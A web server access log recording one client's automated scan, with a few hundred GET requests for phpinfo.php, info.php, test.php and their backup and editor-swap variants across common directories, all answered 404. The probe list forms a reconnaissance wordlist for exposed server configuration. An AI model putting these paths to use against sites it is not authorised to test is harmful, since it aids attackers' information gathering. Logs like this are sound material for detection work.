043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:50;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:51;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:52;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:52;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:54;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:55;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:57;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:58;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:58;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:58;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:59;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:00;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:00;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:00;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:00;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:00;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:00;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:01;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:01;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:01;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:01;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:01;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:01;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:02;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:05;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:05;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:05;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:05;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:05;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:07;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:07;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:07;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:07;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:10;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:10;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:10;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:10;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:11;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:11;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:11;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:11;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:11;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:13;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:16;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:18;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:19;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:19;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:49:19;;/includes/info.php;GET;404
